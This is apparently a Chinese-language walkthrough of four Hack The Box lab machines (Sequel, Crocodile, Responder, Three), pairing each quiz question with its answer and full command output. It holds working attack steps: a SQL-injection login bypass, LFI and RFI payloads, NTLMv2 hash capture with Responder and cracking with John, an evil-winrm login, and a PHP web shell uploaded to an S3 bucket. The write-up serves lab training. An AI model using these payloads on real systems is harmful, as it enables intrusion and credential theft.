+<p>我们可以使用 admin’# 作为凭据，密码可以是任何内容。即可看到flag。</p>
+<h1 id="Sequel"><a href="#Sequel" class="headerlink" title="Sequel"></a>Sequel</h1><p>1.During our scan, which port do we find serving MySQL?</p>
+<p>扫描过程中，我们发现哪个端口在运行 MySQL？</p>
+<p>3306</p>
+<p>2.What community-developed MySQL version is the target running?</p>
+<p>目标系统运行的是哪个社区开发的 MySQL 版本？</p>
+<p>MariaDB</p>
+<p>3.When using the MySQL command line client, what switch do we need to use in order to specify a login username?</p>
+<p>使用 MySQL 命令行客户端时，我们需要使用哪个开关来指定登录用户名？</p>
+<p>-u</p>
+<p>4.Which username allows us to log into this MariaDB instance without providing a password?</p>
+<p>哪个用户名允许我们在不提供密码的情况下登录此 MariaDB 实例？</p>
+<p>root</p>
+<p>5.In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?</p>
+<p>在 SQL 中，我们可以使用哪个符号在查询中指定要显示表中的所有内容？</p>
+<p>*</p>
+<p>6.In SQL, what symbol do we need to end each query with?</p>
+<p>在 SQL 中，每个查询语句的结尾需要使用什么符号？</p>
+<p>;</p>
+<p>7.There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that’s unique to this host?</p>
+<p>此 MySQL 实例中有三个数据库是所有 MySQL 实例共有的。第四个数据库是此主机独有的，它的名称是什么？</p>
+<p>htb</p>
+<p>8.What is the command in MySQL to select a database to interact with?</p>
+<p>在 MySQL 中，选择要交互的数据库的命令是什么？</p>
+<p>use</p>
+<p>9.What is the command in MySQL to show the different columns for a given table?</p>
+<p>在 MySQL 中，显示给定表中不同列的命令是什么？</p>
+<p>describe</p>
+<p>10.Which table has a column named “flag”?</p>
+<p>哪个表有一个名为“flag”的列？</p>
+<p>config</p>
+<p>select * from config;</p>
+<h1 id="Crocodile"><a href="#Crocodile" class="headerlink" title="Crocodile"></a>Crocodile</h1><p>1.What Nmap scanning switch employs the use of default scripts during a scan?</p>
+<p>Nmap 扫描过程中，哪个扫描开关会使用默认脚本？</p>
+<p>-sC</p>
+<p>2.What service version is found to be running on port 21?</p>
+<p>在端口 21 上运行的服务版本是什么？</p>
+<p>vsFTPd 3.0.3</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p 21 -sCV 10.129.127.95</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-12 10:49 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> localhost (10.129.127.95)</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-syst:</span><br><span class="line">|   STAT:</span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:10.10.17.43</span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth <span class="built_in">limit</span></span><br><span class="line">|      Session <span class="built_in">timeout</span> <span class="keyword">in</span> seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 3</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist</span><br><span class="line">|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd</span><br><span class="line">Service Info: OS: Unix</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>3.What FTP code is returned to us for the “Anonymous FTP login allowed” message?</p>
+<p>对于“允许匿名 FTP 登录”消息，返回给我们的 FTP 代码是什么？</p>
+<p>230</p>
+<p>4.After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?</p>
+<p>使用 FTP 客户端连接到 FTP 服务器后，当系统提示匿名登录时，我们应该提供什么用户名？</p>
+<p>anonymous</p>
+<p>5.After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server?</p>
+<p>匿名连接到 FTP 服务器后，我们可以使用什么命令下载在 FTP 服务器上找到的文件？</p>
+<p>get</p>
+<p>6.What is one of the higher-privilege sounding usernames in ‘allowed.userlist’ that we download from the FTP server?</p>
+<p>从 FTP 服务器下载的“allowed.userlist”文件中，有哪些用户名听起来权限较高？</p>
+<p>admin</p>
+<p>7.What version of Apache HTTP Server is running on the target host?</p>
+<p>目标主机上运行的是哪个版本的 Apache HTTP 服务器？</p>
+<p>Apache httpd 2.4.41</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p 80 -sCV 10.129.127.95</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-12 10:58 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> localhost (10.129.127.95)</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-title: Smash - Bootstrap Business Template</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>8.What switch can we use with Gobuster to specify we are looking for specific filetypes?</p>
+<p>我们可以使用 Gobuster 的哪个开关来指定我们要查找的特定文件类型？</p>
+<p>-x</p>
+<p>9.Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service?</p>
+<p>我们可以通过目录暴力破解找到哪个 PHP 文件，从而获得对 Web 服务的身份验证机会？</p>
+<p>login.php</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> allowed.userlist.passwd</span><br><span class="line">root</span><br><span class="line">Supersecretpassword1</span><br><span class="line">@BaASD&amp;9032123sADS</span><br><span class="line">rKXM59ESxesUFHAd</span><br><span class="line"></span><br><span class="line">admin rKXM59ESxesUFHAd </span><br></pre></td></tr></table></figure>
+<h1 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h1><p>1.When visiting the web service using the IP address, what is the domain that we are being redirected to?</p>
+<p>使用 IP 地址访问网络服务时，我们会被重定向到哪个域名？</p>
+<p>unika.htb</p>
+<p>2.Which scripting language is being used on the server to generate webpages?</p>
+<p>服务器端使用哪种脚本语言来生成网页？</p>
+<p>php</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p- --min-rate 2000 10.129.95.234</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-12 14:43 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> localhost (10.129.95.234)</span><br><span class="line">Host is up (0.40s latency).</span><br><span class="line">Not shown: 65532 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">5985/tcp open  wsman</span><br><span class="line">7680/tcp open  pando-pub</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> nmap -p 80,5985,7680 -sCV 10.129.95.234</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-12 14:46 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> localhost (10.129.95.234)</span><br><span class="line">Host is up (0.33s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>m PHP/<span class="number">8.1</span>.<span class="number">1</span>)</span><br><span class="line">|_http-server-header: Apache/<span class="number">2.4</span>.<span class="number">52</span> (Win64) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>m PHP/<span class="number">8.1</span>.<span class="number">1</span></span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-<span class="number">8</span>).</span><br><span class="line"><span class="number">5985</span>/tcp open  http       Microsoft HTTPAPI httpd <span class="number">2.0</span> (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/<span class="number">2.0</span></span><br><span class="line"><span class="number">7680</span>/tcp open  pando-pub?</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>3.What is the name of the URL parameter which is used to load different language versions of the webpage?</p>
+<p>用于加载网页不同语言版本的 URL 参数名称是什么？</p>
+<p>page</p>
+<p>4.Which of the following values for the page parameter would be an example of exploiting a Local File Include (LFI) vulnerability: “french.html”, “//10.10.14.6/somefile”, “../../../../../../../../windows/system32/drivers/etc/hosts”, “mimikatz.exe”</p>
+<p>以下哪个 page 参数值会利用本地文件包含 (LFI) 漏洞：“french.html”、“//10.10.14.6/somefile”、“../../../../../../../windows/system32/drivers/etc/hosts”、“mimikatz.exe”../../../../../../../../windows/system32/drivers/etc/hosts</p>
+<p>5.Which of the following values for the page parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: “french.html”, “//10.10.14.6/somefile”, “./../../../../../../../windows/system32/drivers/etc/hosts”, “mimikatz.exe”</p>
+<p>以下哪个 page 参数值会利用远程文件包含 (RFI) 漏洞？”french.html”, “//10.10.14.6/somefile”, “./../../../../../../../windows/system32/drivers/etc/hosts”, “mimikatz.exe”</p>
+<p>//10.10.14.6/somefile</p>
+<p>6.What does NTLM stand for?</p>
+<p>NTLM 代表什么？</p>
+<p>New Technology LAN Manager</p>
+<p>7.Which flag do we use in the Responder utility to specify the network interface?</p>
+<p>在 Responder 工具中，我们应该使用哪个标志来指定网络接口？</p>
+<p>-I</p>
+<p>8.There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as john, but the full name is what?</p>
+<p>有一些工具会接收 NetNTLMv2 质询/响应，并尝试数百万个密码，以查看是否有任何密码会生成相同的响应。其中一款工具通常被称为 john ，但它的全名是什么？</p>
+<p>John The Ripper</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> responder -I tun0</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> responder -I tun0</span><br><span class="line">[<span class="built_in">sudo</span>] aono 的密码：</span><br><span class="line">                                         __</span><br><span class="line">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.</span><br><span class="line">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|</span><br><span class="line">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|</span><br><span class="line">                   |__|</span><br><span class="line"></span><br><span class="line">           NBT-NS, LLMNR &amp; MDNS Responder 3.1.5.0</span><br><span class="line"></span><br><span class="line">  To support this project:</span><br><span class="line">  Github -&gt; https://github.com/sponsors/lgandx</span><br><span class="line">  Paypal  -&gt; https://paypal.me/PythonResponder</span><br><span class="line"></span><br><span class="line">  Author: Laurent Gaffie (laurent.gaffie@gmail.com)</span><br><span class="line">  To <span class="built_in">kill</span> this script hit CTRL-C</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Poisoners:</span><br><span class="line">    LLMNR                      [ON]</span><br><span class="line">    NBT-NS                     [ON]</span><br><span class="line">    MDNS                       [ON]</span><br><span class="line">    DNS                        [ON]</span><br><span class="line">    DHCP                       [OFF]</span><br><span class="line"></span><br><span class="line">[+] Servers:</span><br><span class="line">    HTTP server                [ON]</span><br><span class="line">    HTTPS server               [ON]</span><br><span class="line">    WPAD proxy                 [OFF]</span><br><span class="line">    Auth proxy                 [OFF]</span><br><span class="line">    SMB server                 [ON]</span><br><span class="line">    Kerberos server            [ON]</span><br><span class="line">    SQL server                 [ON]</span><br><span class="line">    FTP server                 [ON]</span><br><span class="line">    IMAP server                [ON]</span><br><span class="line">    POP3 server                [ON]</span><br><span class="line">    SMTP server                [ON]</span><br><span class="line">    DNS server                 [ON]</span><br><span class="line">    LDAP server                [ON]</span><br><span class="line">    MQTT server                [ON]</span><br><span class="line">    RDP server                 [ON]</span><br><span class="line">    DCE-RPC server             [ON]</span><br><span class="line">    WinRM server               [ON]</span><br><span class="line">    SNMP server                [OFF]</span><br><span class="line"></span><br><span class="line">[+] HTTP Options:</span><br><span class="line">    Always serving EXE         [OFF]</span><br><span class="line">    Serving EXE                [OFF]</span><br><span class="line">    Serving HTML               [OFF]</span><br><span class="line">    Upstream Proxy             [OFF]</span><br><span class="line"></span><br><span class="line">[+] Poisoning Options:</span><br><span class="line">    Analyze Mode               [OFF]</span><br><span class="line">    Force WPAD auth            [OFF]</span><br><span class="line">    Force Basic Auth           [OFF]</span><br><span class="line">    Force LM downgrade         [OFF]</span><br><span class="line">    Force ESS downgrade        [OFF]</span><br><span class="line"></span><br><span class="line">[+] Generic Options:</span><br><span class="line">    Responder NIC              [tun0]</span><br><span class="line">    Responder IP               [10.10.14.92]</span><br><span class="line">    Responder IPv6             [dead:beef:2::105a]</span><br><span class="line">    Challenge <span class="built_in">set</span>              [random]</span><br><span class="line">    Don<span class="string">&#x27;t Respond To Names     [&#x27;</span>ISATAP<span class="string">&#x27;, &#x27;</span>ISATAP.LOCAL<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">    Don&#x27;</span>t Respond To MDNS TLD  [<span class="string">&#x27;_DOSVC&#x27;</span>]</span><br><span class="line">    TTL <span class="keyword">for</span> poisoned response  [default]</span><br><span class="line"></span><br><span class="line">[+] Current Session Variables:</span><br><span class="line">    Responder Machine Name     [WIN-PXEV9A8X9YY]</span><br><span class="line">    Responder Domain Name      [I4SS.LOCAL]</span><br><span class="line">    Responder DCE-RPC Port     [45005]</span><br><span class="line"></span><br><span class="line">[+] Listening <span class="keyword">for</span> events...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问不存在路径时，触发responder劫持</span></span><br><span class="line">http://unika.htb/index.php?page=//10.10.14.92/test</span><br><span class="line"></span><br><span class="line">[SMB] NTLMv2-SSP Client   : 10.129.128.81</span><br><span class="line">[SMB] NTLMv2-SSP Username : RESPONDER\Administrator</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:b5e984fce819c5e0:1E42B8DE3A84AF3C7366BAE0C0AE2959:0101000000000000006B31185DE2DC010C30076FE984DC360000000002000800490034005300530001001E00570049004E002D005000580045005600390041003800580039005900590004003400570049004E002D00500058004500560039004100380058003900590059002E0049003400530053002E004C004F00430041004C000300140049003400530053002E004C004F00430041004C000500140049003400530053002E004C004F00430041004C0007000800006B31185DE2DC0106000400020000000800300030000000000000000100000000200000358078CEFE6F220D92595E20A810823F019774D5967535C33787DCEC3F65CC920A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390032000000000000000000</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Administrator::RESPONDER:b5e984fce819c5e0:1E42B8DE3A84AF3C7366BAE0C0AE2959:0101000000000000006B31185DE2DC010C30076FE984DC360000000002000800490034005300530001001E00570049004E002D005000580045005600390041003800580039005900590004003400570049004E002D00500058004500560039004100380058003900590059002E0049003400530053002E004C004F00430041004C000300140049003400530053002E004C004F00430041004C000500140049003400530053002E004C004F00430041004C0007000800006B31185DE2DC0106000400020000000800300030000000000000000100000000200000358078CEFE6F220D92595E20A810823F019774D5967535C33787DCEC3F65CC920A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390032000000000000000000&quot;</span> &gt; administrator.hash</span><br><span class="line"></span><br><span class="line">john administrator.hash</span><br><span class="line"></span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt administrator.hash</span><br><span class="line"></span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt administrator.hash</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">badminton        (Administrator)</span><br><span class="line">1g 0:00:00:00 DONE (2026-05-12 22:25) 50.00g/s 204800p/s 204800c/s 204800C/s slimshady..oooooo</span><br><span class="line">Use the <span class="string">&quot;--show --format=netntlmv2&quot;</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session completed.</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> evil-winrm -i 10.129.128.81 -u Administrator -p badminton </span><br></pre></td></tr></table></figure>
+<p>9.What is the password for the administrator user?</p>
+<p>管理员用户的密码是什么？</p>
+<p>badminton</p>
+<p>10.We’ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?</p>
+<p>我们将使用 Windows 服务（即在目标主机上运行的服务）通过我们找回的密码远程访问响应服务器。它监听的是哪个 TCP 端口？</p>
+<p>5985</p>
+<p>11.On which user’s desktop is the flag located?</p>
+<p>旗帜位于哪个用户的桌面上？</p>
+<p>mike</p>
+<h1 id="Three"><a href="#Three" class="headerlink" title="Three"></a>Three</h1><p>1.How many TCP ports are open?</p>
+<p>有多少个 TCP 端口处于开放状态？</p>
+<p>2</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p- --min-rate 5000 10.129.227.248</span><br><span class="line">[<span class="built_in">sudo</span>] aono 的密码：</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-12 22:34 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.227.248</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>2.What is the domain of the email address provided in the “Contact” section of the website?</p>
+<p>网站“联系我们”部分提供的电子邮件地址的域名是什么？</p>
+<p>thetoppers.htb</p>
+<p>3.In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?</p>
+<p>在没有 DNS 服务器的情况下，我们可以使用哪个 Linux 文件将主机名解析为 IP 地址，以便能够访问指向这些主机名的网站？</p>
+<p>/etc/hosts</p>
+<p>4.Which sub-domain is discovered during further enumeration?</p>
+<p>在进一步枚举过程中发现了哪个子域？</p>
+<p>s3.thetoppers.htb</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">echo</span> <span class="string">&#x27;10.129.227.248 thetoppers.htb&#x27;</span> &gt;&gt; /etc/hosts</span><br><span class="line"></span><br><span class="line">ffuf -u http://thetoppers.htb -H <span class="string">&#x27;Host: FUZZ.thetoppers.htb&#x27;</span> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 11952 -mc all</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://thetoppers.htb</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.thetoppers.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: all</span></span><br><span class="line"><span class="string"> :: Filter           : Response size: 11952</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">s3                      [Status: 404, Size: 21, Words: 2, Lines: 1, Duration: 298ms]</span></span><br><span class="line"><span class="string">gc._msdcs               [Status: 400, Size: 306, Words: 26, Lines: 11, Duration: 245ms]</span></span><br></pre></td></tr></table></figure>
+<p>5.Which service is running on the discovered sub-domain?</p>
+<p>已发现的子域上运行着哪项服务？</p>
+<p>Amazon S3</p>
+<p>6.Which command line utility can be used to interact with the service running on the discovered sub-domain?</p>
+<p>可以使用哪个命令行实用程序与在已发现的子域上运行的服务进行交互？</p>
+<p>awscli</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip&quot;</span> -o <span class="string">&quot;awscliv2.zip&quot;</span></span><br><span class="line">unzip awscliv2.zip</span><br><span class="line"><span class="built_in">sudo</span> ./aws/install</span><br></pre></td></tr></table></figure>
+<p>7.Which command is used to set up the AWS CLI installation?</p>
+<p>用于设置 AWS CLI 的命令是什么？</p>
+<p>aws configure</p>
+<p>8.What is the command used by the above utility to list all of the S3 buckets?</p>
+<p>上述工具用来列出所有 S3 存储桶的命令是什么？</p>
+<p>aws s3 ls</p>
+<p>9.语言 php</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">aws configure</span><br><span class="line"></span><br><span class="line">aws s3 <span class="built_in">ls</span> --endpoint http://s3.thetoppers.htb s3://thetoppers.htb</span><br><span class="line"></span><br><span class="line">                           PRE images/</span><br><span class="line">2026-05-13 08:57:03          0 .htaccess</span><br><span class="line">2026-05-13 08:57:03      11952 index.php</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> &gt; shell.php</span><br><span class="line"></span><br><span class="line">aws s3 <span class="built_in">cp</span> shell.php s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb</span><br><span class="line"></span><br><span class="line">ip a | grep tun0</span><br><span class="line">77562: tun0: &lt;POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500</span><br><span class="line">    inet 10.10.17.43/23 brd 10.10.17.255 scope global tun0</span><br><span class="line"></span><br><span class="line">curl http://thetoppers.htb/shell.php?cmd=<span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">images</span><br><span class="line">index.php</span><br><span class="line">shell.php</span><br><span class="line"></span><br><span class="line">curl <span class="string">&#x27;http://thetoppers.htb/shell.php?cmd=cd%20..&#x27;</span></span><br><span class="line">curl <span class="string">&#x27;http://thetoppers.htb/shell.php?cmd=cat%20../flag.txt&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>在这个特定的靶机场景中，S3 存储桶实际上被用作了该网站（thetoppers.htb）的后端存储目录（即 Web 根目录）。</p>
+<ul>
+<li>文件同步/挂载：这台服务器在内部进行了配置，使得托管网站文件的目录（比如 /var/www/html）与名为 thetoppers.htb 的 S3 存储桶进行了绑定或同步。我们在 S3 存储桶里看到的 index.php，正是网站首页运行的代码。</li>
+<li>漏洞产生的核心原因：正是因为这种直接的绑定关系，当攻击者（你）使用 AWS 命令行工具（aws cli）将包含恶意代码的 shell.php 上传到这个 S3 存储桶后，这个文件就直接出现在了网站的目录中。</li>
+<li>实现攻击：当你通过浏览器访问 <a target="_blank" rel="noopener" href="http://thetoppers.htb/shell.php">http://thetoppers.htb/shell.php</a> 时，网站服务器不仅能找到你刚刚上传的文件，而且服务器配置了 PHP 环境，它会解析并执行这个木马脚本，从而导致你的机器获得了目标服务器的控制权（反向 Shell）。</li>
+</ul>
+<p>简而言之，它们的关系是：S3 存储桶 = 网站所在的文件夹。控制了存储桶，就等于获得了随意篡改、添加网站代码的权限。</p>
